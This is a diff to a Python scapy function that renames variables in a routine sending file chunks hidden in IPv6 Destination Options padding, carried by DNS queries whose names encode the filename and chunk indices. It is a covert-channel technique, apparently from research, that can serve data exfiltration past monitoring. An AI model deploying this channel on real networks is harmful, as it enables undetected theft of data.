@@ -1,19 +1,18 @@
 import getinfo
 from scapy.all import *
-def generate_send(filename, cw_list, data_cnt, last):
+def generate_send(filename, cw_list, cw_cnt, pad_bytes):
     dnsIP = getinfo.dst_addrs()
-    fqdn_front = filename + '.' + str(data_cnt) + '.'
-    fqdn_last = '.' + str(last) + '.pearl.org'
-    print("FQDN --> {}<data_index>{}".format(fqdn_front, fqdn_last))
-    for data_index in range(data_cnt):
+    fqdn_prefix = filename + '.' + str(cw_cnt) + '.'
+    fqdn_suffix = '.' + str(pad_bytes) + '.pearl.org'
+    for chunk_num in range(cw_cnt):
         for slice in range(16):
-            whois = fqdn_front + str(data_index) + fqdn_last
+            fqdn = fqdn_prefix + str(chunk_num) + fqdn_suffix
             pkt = IPv6(dst=dnsIP)/ \
-                  IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cw_list[data_index][slice]))/ \
+                  IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cw_list[chunk_num][slice]))/ \
                   UDP(dport=53)/ \
-                  DNS(id=slice, qd=DNSQR(qname=whois, qtype="A"))
+                  DNS(id=slice, qd=DNSQR(qname=fqdn, qtype="A"))
             send(pkt, verbose=0)
-            print("Transfer progress: packet index [{}]".format(data_index * 16 + slice), end = '\r')
+            print("Transfer progress: packet index [{}]".format(chunk_num * 16 + slice), end = '\r')
     return True
 
 def pkt_loss_send(filename, cwlist, cw_cnt, last):
